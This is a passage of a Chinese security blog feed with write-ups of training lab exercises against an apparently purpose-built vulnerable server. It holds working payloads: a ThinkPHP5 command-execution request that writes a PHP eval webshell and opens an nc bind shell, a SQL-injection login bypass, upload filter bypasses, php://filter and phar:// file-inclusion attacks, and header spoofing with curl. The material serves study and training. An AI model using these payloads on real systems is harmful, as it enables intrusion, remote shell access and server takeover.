class="string">0</span>]=system&amp;vars[1][]=echo ^&lt;?php @eval($<span class="emphasis">_GET["code"])?^&gt;&gt;shell.php</span></span><br></pre></td></tr></table></figure><p>尝试正向shell。</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.105.75.177/owasp/vulnlab/exec/thinkphp5/thinkphp50/public/index.php?s=index/\think\app/invokefunction&amp;function=call<span class="emphasis">_user_</span>func_array&amp;vars[<span class="string">0</span>]=system&amp;vars[<span class="string">1</span>][<span class="symbol"></span>]=nc -lvp 31328 -e /bin/bash</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200426190529727.png" alt="image-20200426190529727"></p><p>正向shell成功。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要描述了：（1）一些软件出现的命令执行漏洞（包括dvwa,struts,thinkphp,ImageMagick)（2）可能出现命令执行漏洞的&lt;strong&gt;PHP代码执行函数&lt;/strong&gt;分析。（3）能执行系统命令的&lt;strong&gt;系统命令执行函数&lt;/strong&gt;分析&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="http://blog.ydq6.com/categories/web/"/>
    
    
      <category term="web" scheme="http://blog.ydq6.com/tags/web/"/>
    
      <category term="命令执行" scheme="http://blog.ydq6.com/tags/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
    
  </entry>
  
  <entry>
    <title>合天培训_实验_文件上传考核</title>
    <link href="http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%80%83%E6%A0%B8/"/>
    <id>http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E8%80%83%E6%A0%B8/</id>
    <published>2020-05-01T08:50:32.000Z</published>
    <updated>2020-05-01T15:47:04.613Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要讲解几个cms中出现的文件上传漏洞，以及对应的攻击方法。</p><a id="more"></a><h2 id="1-beecms"><a href="#1-beecms" class="headerlink" title="1.beecms"></a>1.beecms</h2><p>首先后台登录</p><p>绕过登录方法：</p><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">用户名：admi' Un union ion Se%select%lect <span class="number">1</span>,'admin','<span class="number">9003</span>d1df22eb4d3820015070385194c8',<span class="number">4</span>,<span class="number">0</span> #</span><br><span class="line">密码：pwd</span><br></pre></td></tr></table></figure><p>在后台发现上传图片功能：</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://47.105.75.177/vulnlab/sqli/beecms/admin/admin_content.php?action=<span class="meta">add</span><span class="variable">&amp;id</span>=3<span class="variable">&amp;nav</span>=add_channel_product<span class="variable">&amp;admin_p_nav</span>=content<span class="variable">&amp;lang</span>=cn</span><br></pre></td></tr></table></figure><p>实际检测，发现是MIME白名单检测，所以Burp改包即可。</p><p>然后在图片管理中可以看到上传的文件的路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/vulnlab/</span>sqli<span class="regexp">/beecms/u</span>pload<span class="regexp">/img/</span><span class="number">202004201359505400</span>.php</span><br></pre></td></tr></table></figure><h2 id="2-fiyocms"><a href="#2-fiyocms" class="headerlink" title="2.fiyocms"></a>2.fiyocms</h2><p>账户密码admin/admin888登录</p><p>找到上传文件的点：</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">http:</span>/<span class="regexp">/47.105.75.177/vulnlab</span><span class="regexp">/upload/fiyocms</span><span class="regexp">/dapur/</span>?app=media&amp;<span class="keyword">type</span>=files</span><br></pre></td></tr></table></figure><p>但是上传按钮按不动。其他功能点也没有上传的，放弃。</p><p>老师讲了后发现themes下面有漏洞。</p><p>（1）任意文件读取</p><p>（2）任意文件上传</p><h2 id="3-phpok"><a href="#3-phpok" class="headerlink" title="3.phpok"></a>3.phpok</h2><p>账户密码admin/admin登录</p><p>找到修改头像的点，发现只能上传图像。</p><p>上传一个后缀名改为gif的php代码。</p><p>然后改包：</p><p><img src="/assets/image-20200420145021307.png" alt="image-20200420145021307"></p><p>发现php被过滤了。</p><p>php fuzz测试。发现均被过滤了。</p><p>换思路，扫后台</p><p>扫出admin.php</p><p>登录发现不正确，应该用户表和管理员表是两张。</p><p>用户名：admin,密码： admin888 (利用其他网站的sql注入获得)</p><p>在工具，附件分类管理中gif,png,jpg后面再加个php。然后再文件上传即可。</p><p><img src="/assets/image-20200420154112973.png" alt="image-20200420154112973"></p><p>看burp包得到上传路径：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res/<span class="number">202004</span>/<span class="number">20</span>/<span class="number">1555e119f</span>9dc2b1f.php</span><br></pre></td></tr></table></figure><p>访问资源即可：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/phpok/</span>res<span class="regexp">/202004/</span><span class="number">20</span><span class="regexp">/1555e119f9dc2b1f.php</span></span><br></pre></td></tr></table></figure><p>为了方便其他同学做再改回去。</p><h2 id="4-geez"><a href="#4-geez" class="headerlink" title="4.geez"></a>4.geez</h2><p>同样sql注入得到账户名密码：admin/admin445</p><p>发现进去就有上传文件的点。用fuzz模糊测试发现很好绕过。直接php.即可。</p><p>然后在主页再检查头像的地址：</p><p>得到上传文件：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./upload/<span class="number">1</span>_dama1.php.</span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/denglu/u</span>pload<span class="regexp">/1_dama1.php.</span></span><br></pre></td></tr></table></figure><p>发现不能解析。</p><p>改为大小写绕过得到上传文件：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./upload/<span class="number">1</span>_dama1.php</span><br></pre></td></tr></table></figure><p>访问：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/u</span>pload<span class="regexp">/denglu/u</span>pload<span class="regexp">/1_dama1.php</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要讲解几个cms中出现的文件上传漏洞，以及对应的攻击方法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="http://blog.ydq6.com/categories/web/"/>
    
    
      <category term="web" scheme="http://blog.ydq6.com/tags/web/"/>
    
      <category term="文件上传" scheme="http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"/>
    
  </entry>
  
  <entry>
    <title>合天培训_实验_文件包含漏洞</title>
    <link href="http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/"/>
    <id>http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/</id>
    <published>2020-05-01T04:51:26.000Z</published>
    <updated>2020-05-01T15:46:32.052Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要描述了文件包含漏洞实验，包括本地文件包含和远程文件包含，以及攻击方法。</p><a id="more"></a><h2 id="本地文件包含"><a href="#本地文件包含" class="headerlink" title="本地文件包含"></a>本地文件包含</h2><p>（1）提示include.php，访问include.php</p><p>（2）提示参数为file.利用file=include.php发现文件包含生效。</p><p>（3）尝试读取源代码</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">file</span>=php://<span class="built_in">filter</span>/<span class="built_in">convert</span>.base64-encode/resource=<span class="built_in">include</span>.php</span><br></pre></td></tr></table></figure><p><img src="/assets/image-20200421212856583-1588308709161.png" alt="image-20200421212856583"></p><p>base64解码后：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">Tips: the parameter is file! :) </span><br><span class="line"><span class="comment">&lt;!-- upload.php --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    @$file = $_GET[<span class="string">"file"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">include</span>($file);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>可以看到有后名单机制，包括http,data,ftp,input，而且是大小写不敏感。</p><p>（4）注意到注释中有upload.php。访问upload.php。发现可以文件上传（这里也可以用fuzz来找到upload.php）。</p><p>上传一个一句话木马post.php。发现上传失败</p><p>因为有文件包含漏洞，所以只要不是文件内容检测都能绕过，将post.php改为post.png.</p><p>上传成功：</p><p><img src="/assets/image-20200421225912301-1588308709163.png" alt="image-20200421225912301"></p><p>接下来进行文件包含。</p><p> <a href="http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png" target="_blank" rel="noopener">http://47.105.75.177/vulnlab/include/1/include.php?file=./upload/post.png</a> </p><p>利用菜刀连接即可。</p><p><img src="/assets/image-20200421230943902-1588308709163.png" alt="image-20200421230943902"></p><h2 id="远程文件包含"><a href="#远程文件包含" class="headerlink" title="远程文件包含"></a>远程文件包含</h2><p>（1）参数有file,提示php文件。代表只输入文件名就可以。</p><p>猜测代码：</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">'file'</span>].<span class="string">"php"</span>;</span><br><span class="line"><span class="keyword">include</span>(<span class="variable">$file</span>);</span><br></pre></td></tr></table></figure><p>（2）读源码</p><p>file=php://filter/convert.base64-encode/resource=include</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">Tips:  </span><br><span class="line"><span class="comment">&lt;!-- upload.php --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">    @$file = $_GET[<span class="string">"file"</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>(<span class="keyword">isset</span>($file))</span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">        <span class="keyword">if</span> (preg_match(<span class="string">'/http|data|ftp|input|%00/i'</span>, $file) || strstr($file,<span class="string">".."</span>) !== <span class="keyword">FALSE</span> || strlen($file)&gt;=<span class="number">70</span>)</span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">echo</span> <span class="string">"&lt;p&gt; error! &lt;/p&gt;"</span>;</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">        <span class="keyword">else</span></span></span><br><span class="line"><span class="php">        &#123;</span></span><br><span class="line"><span class="php">            <span class="keyword">include</span>($file.<span class="string">'.php'</span>);</span></span><br><span class="line"><span class="php">        &#125;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php"><span class="meta">?&gt;</span></span></span><br></pre></td></tr></table></figure><p>题目要求phar，现在上传一个zip文件。</p><p><img src="/assets/image-20200421231446262-1588308709163.png" alt="image-20200421231446262"></p><p>发现不能上传zip。抓包看下是基于什么机制过滤的。</p><p>发现Mime类型不行。加点大小写什么的都不行。文件上传这个点做的比较严格。但是因为有文件包含漏洞，所以我的zip后缀改为任意的都行，比如改为jpg</p><p><img src="/assets/image-20200421232107205-1588308709164.png" alt="image-20200421232107205"></p><p>然后利用phar协议访问zip中的post.php</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//u</span>pload<span class="regexp">/webshell.jpg/</span>post.php</span><br></pre></td></tr></table></figure><p>用菜刀连接尝试,发现连接失败。</p><p>看了下路径不对，第二道题和第一道题不是在同一个路径下，改一下路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//</span>..<span class="regexp">/1/u</span>pload<span class="regexp">/webshell.jpg/</span>post.php</span><br></pre></td></tr></table></figure><p>发现报错error。</p><p>再想一下，不仅忘记去掉后缀名php了，而且不支持..</p><p>尝试使用绝对路径</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">47.105</span>.<span class="number">75.177</span><span class="regexp">/vulnlab/i</span>nclude<span class="regexp">/2/i</span>nclude.php?file=phar:<span class="regexp">//</span><span class="regexp">/var/</span>www<span class="regexp">/html/</span>vulnlab<span class="regexp">/include/</span><span class="number">1</span><span class="regexp">/upload/</span>webshell.jpg<span class="regexp">/post</span></span><br></pre></td></tr></table></figure><p>菜刀连接，成功连接</p><p><img src="/assets/image-20200421233702677-1588308709164.png" alt="image-20200421233702677"></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要描述了文件包含漏洞实验，包括本地文件包含和远程文件包含，以及攻击方法。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="http://blog.ydq6.com/categories/web/"/>
    
    
      <category term="web" scheme="http://blog.ydq6.com/tags/web/"/>
    
      <category term="文件包含" scheme="http://blog.ydq6.com/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
  </entry>
  
  <entry>
    <title>合天培训_实验_web安全之HTTP头部字段理解</title>
    <link href="http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/"/>
    <id>http://blog.ydq6.com/web/%E5%90%88%E5%A4%A9%E5%9F%B9%E8%AE%AD_%E5%AE%9E%E9%AA%8C_web%E5%AE%89%E5%85%A8%E4%B9%8BHTTP%E5%A4%B4%E9%83%A8%E5%AD%97%E6%AE%B5%E7%90%86%E8%A7%A3/</id>
    <published>2020-04-30T12:55:32.000Z</published>
    <updated>2020-05-01T15:47:22.127Z</updated>
    
    <content type="html"><![CDATA[<p>本文主要是讲解http头部字段实验，实验的目的是加深对http请求头的理解。</p><a id="more"></a><h2 id="第一题-观察HTTP-响应头"><a href="#第一题-观察HTTP-响应头" class="headerlink" title="第一题 观察HTTP 响应头"></a>第一题 观察HTTP 响应头</h2><p>题目提示观察http响应头所以只观察响应头即可。通过命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/1.php</span><br></pre></td></tr></table></figure><p>得到:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key: hello world!</span><br></pre></td></tr></table></figure><h2 id="第二题-Referer理解"><a href="#第二题-Referer理解" class="headerlink" title="第二题 Referer理解"></a>第二题 Referer理解</h2><p>提示必须从<a href="http://www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段" target="_blank" rel="noopener">www.baidu.com跳转过来，所以在请求头中直接伪造Refer字段</a></p><p>通过命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H Referer:http://www.baidu.com 47.105.75.177/vulnlab/head/2.php</span><br></pre></td></tr></table></figure><p>从响应中获取key:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure><h2 id="第三题-X-Forwarded-For理解"><a href="#第三题-X-Forwarded-For理解" class="headerlink" title="第三题 X-Forwarded-For理解"></a>第三题 X-Forwarded-For理解</h2><p>通过浏览器检查获取网址47.105.75.177/vulnlab/head/3.php，点击网址后自动跳转到 <a href="http://www.hetianlab.com/" target="_blank" rel="noopener">http://www.hetianlab.com/</a> 。先curl下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure><p>得到：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">this page only accept come from localhost</span><br></pre></td></tr></table></figure><p>本地才能访问，所以伪造X-Forwarded-For为127.0.0.1</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H X-Forwarded-For:127.0.0.1 47.105.75.177/vulnlab/head/3.php</span><br></pre></td></tr></table></figure><p>得到key</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure><h2 id="第四题-User-Agent理解"><a href="#第四题-User-Agent理解" class="headerlink" title="第四题 User-Agent理解"></a>第四题 User-Agent理解</h2><p>题目提示只能从iPhone中发起访问，猜测检查不严格。直接伪造User-Agent:iPhone。curl命令：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H User-Agent:iPhone 47.105.75.177/vulnlab/head/4.php</span><br></pre></td></tr></table></figure><p>得到key:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key: you are right</span><br></pre></td></tr></table></figure><p>第五题 Accept-Language理解</p><p>题目提示只允许外国人登录,猜测接收语言为英语即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -H Accept-Language:en_us 47.105.75.177/vulnlab/head/5.php</span><br></pre></td></tr></table></figure><h2 id="第六题-Cookie理解"><a href="#第六题-Cookie理解" class="headerlink" title="第六题 Cookie理解"></a>第六题 Cookie理解</h2><p>题目提示一定要用admin登录，又是cookie，猜测cookie中有判断是否admin字段。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -v 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure><p>发现响应头中会设置cookie:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-Cookie: Login=anonymous</span><br></pre></td></tr></table></figure><p>所以请求时将cookie设置为Login=admin即可。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --cookie Login=admin 47.105.75.177/vulnlab/head/6.php</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;本文主要是讲解http头部字段实验，实验的目的是加深对http请求头的理解。&lt;/p&gt;
    
    </summary>
    
    
      <category term="web安全" scheme="http://blog.ydq6.com/categories/web/"/>
    
    
      <category term="web" scheme="http://blog.ydq6.com/tags/web/"/>
    
      <category term="http" scheme="http://blog.ydq6.com/tags/http/"/>
    
  </entry>
  
</feed>
